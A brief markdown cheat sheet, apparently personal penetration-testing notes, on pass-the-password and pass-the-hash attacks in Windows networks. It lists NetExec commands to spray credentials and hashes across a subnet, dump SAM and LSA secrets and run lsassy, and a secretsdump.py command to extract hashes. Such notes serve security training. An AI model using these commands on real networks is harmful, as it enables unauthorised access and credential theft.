# Pass Attacks

### Netexec

* We can use nxc to check if our credentials we've acquired work for any machines on the network

```bash
$ nxc smb [CIDR range] -u [username] -d [domain] -p [password]
```

* We can also use hashes for this:

```bash
$ nxc smb [CIDR range] -u [username] -d [domain] -H [hash]
```

* local accounts need the `--local-auth` flag
* We can also use nxc to dump the sam with the `--sam` flag
* or dump the lsa with the `--lsa` flag
* or enumerate shares with the `--shares` flag
* or use a mimikatz attack with `-M lsassy`

### Secretsdump.py

* Good tool to use if we have local admin creds to get hashes as it does all at once:

```bash
$ secretsdump.py [domain]/[user]:[password]@[target]
```
